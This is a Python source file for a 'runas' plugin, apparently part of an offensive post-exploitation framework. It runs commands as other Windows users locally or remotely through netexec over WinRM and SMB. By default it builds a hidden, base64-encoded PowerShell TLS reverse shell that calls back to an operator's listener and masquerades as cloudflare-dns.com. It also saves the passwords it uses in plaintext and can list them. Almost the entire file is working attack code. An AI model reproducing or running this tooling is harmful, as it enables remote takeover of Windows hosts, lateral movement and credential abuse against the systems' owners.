import argparse
import json
import os
import subprocess
import sys
import base64
import shutil
from typing import Optional, Dict, List, Tuple, Any
from ..api import plugin, SessionContext
from ..shared.common import format_runas_report

if sys.platform == 'win32':
    import winreg
else:
    winreg = None

RUNAS_USAGE = """
runas — Execute commands as another user on Windows (local or remote).

This plugin replicates the general functionality of the Windows runas utility.
It supports running a command with alternate credentials, either on the local
machine or on a remote host (via WinRM/SMB using netexec). It can also manage
saved credentials for later reuse.

Usage:
  runas -u <username> [-p <password> | -sv | -wsv] -h <host> [-C <command>] [-rh <host> -rp <port>] [-d <domain>]
  runas -eu

Options:
  -u, --username <user>      Username (required unless -eu is used)
  -p, --password <pass>      Password (required unless -sv, -wsv, or -eu is used)
  -h, --host <host>          Target host (localhost or remote IP/hostname). If omitted, localhost is assumed.
  -C, --custom <command>     Custom command to execute instead of the reverse shell payload.
                             The command is automatically backgrounded and does not require manual quoting.
  -sv, --saved-cred          Use a credential saved in our own store (runas_creds.json).
  -wsv, --windows-saved-cred Use Windows system saved credentials (/savecred) – only supported for localhost.
  -eu, --enum-cred           Enumerate all saved credentials and exits (ignores all other arguments).
  -rh, --callback-host <ip>  Listener IP for reverse shell (required unless -C is given).
  -rp, --callback-port <port> Listener TLS port (required unless -C is given).
  -d, --domain <domain>      Domain for the user (e.g., CONTOSO). If not given, the username is used as-is.

Credential Storage:
  Our own credentials are stored in <tool_root>/logs/runas_creds.json. When a command succeeds
  with -p, the credential is automatically saved for that username. Use -sv to
  reuse a saved credential without providing -p.

  Using -wsv tells the plugin to rely on Windows Credential Manager (i.e., credentials
  stored with 'cmdkey' or via the runas /savecred prompt). This works only on the
  local machine.

Remote Execution:
  For remote hosts (non-localhost), this plugin requires the 'netexec' (nxc) tool
  to be installed and in PATH. It tries WinRM first, then SMB. Remote execution
  does NOT support -wsv.

Local Execution:
  For localhost, the command is run via PowerShell's Start-Process with the
  supplied credentials (or via runas /savecred if -wsv is used), running in the
  background.

Default Payload:
  If -C is not provided, a TLS reverse shell payload is generated and executed.
  The payload connects back to the specified -rh/-rp listener.

Examples:
  # Run whoami on remote host as domain user
  runas -u admin -p pass -d CONTOSO -h 192.168.1.10 -C "whoami"

  # Launch reverse shell on localhost as domain user
  runas -u backup -p secret -d MYDOM -h localhost -rh 10.0.0.5 -rp 4444

  # Use our saved credential for domain user 'admin'
  runas -u admin -sv -d CONTOSO -h 192.168.1.10 -C "ipconfig"

  # Use Windows system saved credentials (local only)
  runas -u domain\\user -wsv -h localhost -C "whoami"

  # List saved credentials (our store only)
  runas -eu
""".strip()

PLUGIN_INFO = RUNAS_USAGE

TOOL_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CREDENTIALS_FILE = os.path.join(TOOL_ROOT, "logs", "runas_creds.json")

def _ensure_cred_dir():
    os.makedirs(os.path.dirname(CREDENTIALS_FILE), exist_ok=True)

def _load_creds() -> Dict[str, str]:
    _ensure_cred_dir()
    if os.path.exists(CREDENTIALS_FILE):
        try:
            with open(CREDENTIALS_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def _save_creds(creds: Dict[str, str]):
    _ensure_cred_dir()
    with open(CREDENTIALS_FILE, 'w') as f:
        json.dump(creds, f, indent=2)

def _save_credential(username: str, password: str):
    creds = _load_creds()
    creds[username] = password
    _save_creds(creds)

def _get_credential(username: str) -> Optional[str]:
    creds = _load_creds()
    return creds.get(username)

def _list_credentials() -> List[str]:
    creds = _load_creds()
    return list(creds.keys())

def is_domain_joined() -> bool:
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters")
        domain, _ = winreg.QueryValueEx(key, "Domain")
        winreg.CloseKey(key)
        return bool(domain and domain.strip())
    except FileNotFoundError:
        return False
    except Exception:
        return False

def generate_windows_payload(callback_host: str, callback_port: int) -> str:
    ps_script = (
        f"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{callback_host}', {callback_port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{$SslStream.Close();exit}}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"
    )
    encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
    return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Start-Process -WindowStyle Hidden -NoNewWindow -FilePath powershell -ArgumentList \'-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}\'"'

def execute_local_with_password(username: str, password: str, command: str) -> Tuple[bool, str]:
    escaped_cmd = command.replace("'", "''")
    ps_command = (
        f"$secpass = ConvertTo-SecureString '{password}' -AsPlainText -Force; "
        f"$cred = New-Object System.Management.Automation.PSCredential ('{username}', $secpass); "
        f"Start-Process -FilePath 'cmd.exe' -ArgumentList '/c {escaped_cmd}' -Credential $cred -WindowStyle Hidden -NoNewWindow"
    )
    try:
        subprocess.Popen(
            ["powershell", "-Command", ps_command],
            shell=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True, "Command started in background"
    except Exception as e:
        return False, str(e)

def execute_local_with_windows_saved_cred(username: str, command: str) -> Tuple[bool, str]:
    runas_cmd = f'runas /savecred /user:{username} "cmd /c {command}"'
    try:
        subprocess.Popen(
            runas_cmd,
            shell=True,
            creationflags=0x08000000,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True, "Command started with Windows saved credentials (runas /savecred)"
    except Exception as e:
        return False, str(e)

def _find_nxc() -> Optional[str]:
    for cmd in ["netexec", "nxc"]:
        path = shutil.which(cmd)
        if path:
            try:
                subprocess.run([path, "--help"], capture_output=True, timeout=5, check=False)
                return path
            except Exception:
                continue
    return None

def execute_remote(host: str, username: str, password: str, command: str, domain: Optional[str] = None) -> Tuple[bool, str]:
    nxc_path = _find_nxc()
    if not nxc_path:
        return False, "netexec (nxc) is required for remote execution but could not be found or is not functional."

    winrm_cmd = [nxc_path, "winrm", host, "-u", username, "-p", password]
    if domain:
        winrm_cmd.extend(["-d", domain])
    winrm_cmd.extend(["-x", command])

    smb_cmd = [nxc_path, "smb", host, "-u", username, "-p", password]
    if domain:
        smb_cmd.extend(["-d", domain])
    smb_cmd.extend(["-x", command])

    try:
        proc = subprocess.run(winrm_cmd, capture_output=True, text=True, timeout=120)
        if proc.returncode == 0:
            return True, proc.stdout
        winrm_err = proc.stderr.strip() or proc.stdout.strip()
    except Exception as e:
        winrm_err = str(e)

    try:
        proc = subprocess.run(smb_cmd, capture_output=True, text=True, timeout=120)
        if proc.returncode == 0:
            return True, proc.stdout
        smb_err = proc.stderr.strip() or proc.stdout.strip()
        return False, f"WinRM failed: {winrm_err}\nSMB failed: {smb_err}"
    except Exception as e:
        return False, f"WinRM failed: {winrm_err}\nSMB exception: {str(e)}"

def execute_command(target_host: str, username: str, password: Optional[str],
                    command: str, windows_saved_cred: bool = False,
                    domain: Optional[str] = None) -> Tuple[bool, str]:
    is_local = target_host is None or target_host.lower() in ("localhost", "127.0.0.1", "::1")
    if windows_saved_cred:
        if not is_local:
            return False, "Windows saved credentials (-wsv) are only supported for localhost."
        return execute_local_with_windows_saved_cred(username, command)
    else:
        if is_local:
            return execute_local_with_password(username, password, command)
        else:
            return execute_remote(target_host, username, password, command, domain)

def parse_runas_args(args: List[str]) -> Dict:
    parser = argparse.ArgumentParser(
        description="Run a command as another user (Windows only).",
        add_help=False
    )
    parser.add_argument('-u', '--username', help='Username')
    parser.add_argument('-p', '--password', help='Password')
    parser.add_argument('-H', '--host', help='Target host (localhost or remote)')
    parser.add_argument('-C', '--custom', help='Custom command to execute')
    parser.add_argument('-sv', '--saved-cred', action='store_true', help='Use our saved credential')
    parser.add_argument('-wsv', '--windows-saved-cred', action='store_true', help='Use Windows system saved credentials (local only)')
    parser.add_argument('-eu', '--enum-cred', action='store_true', help='Enumerate saved credentials')
    parser.add_argument('-rh', '--callback-host', help='Listener IP for reverse shell')
    parser.add_argument('-rp', '--callback-port', type=int, help='Listener port for reverse shell')
    parser.add_argument('-d', '--domain', help='Domain for the user (e.g., CONTOSO)')
    parser.add_argument('--help', action='store_true')

    host_from_h = None
    if '-h' in args:
        idx = args.index('-h')
        if idx + 1 < len(args) and not args[idx+1].startswith('-'):
            host_from_h = args[idx+1]

    parsed, unknown = parser.parse_known_args(args)

    if host_from_h is not None:
        parsed.host = host_from_h
    elif parsed.host is None and '-H' in args:
        idx = args.index('-H')
        if idx + 1 < len(args) and not args[idx+1].startswith('-'):
            parsed.host = args[idx+1]

    if parsed.help or (len(args) == 0) or (args[0] in ('-h', '--help') and len(args)==1):
        parser.print_help()
        sys.exit(0)

    if parsed.enum_cred:
        return {'enum_cred': True}

    if not parsed.username:
        raise ValueError("Username (-u) is required unless -eu is used.")

    full_username = parsed.username
    if parsed.domain:
        full_username = f"{parsed.domain}\\{parsed.username}"

    cred_methods = sum([bool(parsed.password), parsed.saved_cred, parsed.windows_saved_cred])
    if cred_methods == 0:
        raise ValueError("One of -p, -sv, or -wsv is required.")
    if cred_methods > 1:
        raise ValueError("Only one of -p, -sv, or -wsv may be used.")

    if parsed.saved_cred:
        pw = _get_credential(full_username)
        if pw is None:
            raise ValueError(f"No saved credential found for user '{full_username}' in our store.")
        parsed.password = pw
        parsed.windows_saved_cred = False
    elif parsed.windows_saved_cred:
        parsed.password = None

    if parsed.host is None:
        parsed.host = "localhost"

    if parsed.custom is None:
        if parsed.callback_host is None or parsed.callback_port is None:
            raise ValueError("When -C is not provided, both -rh and -rp are required.")
    else:
        parsed.callback_host = parsed.callback_host or "0.0.0.0"
        parsed.callback_port = parsed.callback_port or 0

    parsed.full_username = full_username
    return vars(parsed)

def run_plugin(session, args):
    if sys.platform != 'win32':
        session.print("This plugin is only supported on Windows systems.", 'red')
        return 1

    if not args or any(a in ('-h', '--help') for a in args):
        session.print(RUNAS_USAGE)
        return 0

    session.log_event('runas: execution started')

    try:
        params = parse_runas_args(args)
    except ValueError as e:
        session.print(f"Argument error: {e}", 'red')
        session.log_plugin_result('runas', '', 'argument_error')
        return 1

    if params.get('enum_cred'):
        creds = _list_credentials()
        if creds:
            session.print("Saved credentials (our store):", 'cyan')
            for username in creds:
                session.print(f"  {username}", 'white')
            session.log_plugin_result('runas', 'Enumerated saved credentials', 'success')
        else:
            session.print("No saved credentials found in our store.", 'yellow')
            session.log_plugin_result('runas', 'No saved credentials', 'info')
        return 0

    username = params['full_username']
    password = params.get('password')
    host = params['host']
    custom = params.get('custom')
    callback_host = params.get('callback_host')
    callback_port = params.get('callback_port')
    windows_saved_cred = params.get('windows_saved_cred', False)
    domain = params.get('domain')

    if domain and host.lower() in ("localhost", "127.0.0.1", "::1"):
        if not is_domain_joined():
            session.print("Error: This machine is not joined to a domain. Domain credentials cannot be used locally.", 'red')
            session.log_plugin_result('runas', 'Domain credentials on non-domain machine', 'failure')
            return 1

    if custom:
        encoded = base64.b64encode(custom.encode('utf-16le')).decode()
        command = f'powershell -Command "Start-Process -WindowStyle Hidden -FilePath powershell -ArgumentList \'-EncodedCommand {encoded}\'"'
        command_display = custom
        session.print(f"Executing custom command on {host} as {username}: {custom}", 'yellow')
    else:
        command = generate_windows_payload(callback_host, callback_port)
        command_display = f"Reverse shell (TLS to {callback_host}:{callback_port})"
        session.print(f"Generating reverse shell payload (TLS to {callback_host}:{callback_port})...", 'yellow')
        session.print("Delivering payload in background...", 'yellow')

    success, output = execute_command(
        target_host=host,
        username=username,
        password=password,
        command=command,
        windows_saved_cred=windows_saved_cred,
        domain=domain
    )

    credential_saved = False
    if success and not params.get('saved_cred') and not windows_saved_cred and password:
        _save_credential(username, password)
        credential_saved = True

    result = {
        'host': host,
        'username': username,
        'command_display': command_display,
        'success': success,
        'output': output if output else '',
        'credential_saved': credential_saved,
        'execution_method': 'local' if host.lower() in ("localhost", "127.0.0.1", "::1") else 'remote',
    }

    if success:
        session.log_plugin_result('runas', f"Executed on {host} as {username}", 'success')
    else:
        session.log_plugin_result('runas', f"Failed on {host} as {username}: {output}", 'failure')

    report = format_runas_report(result)
    session.print(report, 'white')

    return 0 if success else 1

@plugin.command(
    name='runas',
    platforms=['windows'],
    description='Execute commands as another user (local or remote) with credential management.'
)
def runas(session, args):
    return run_plugin(session, args)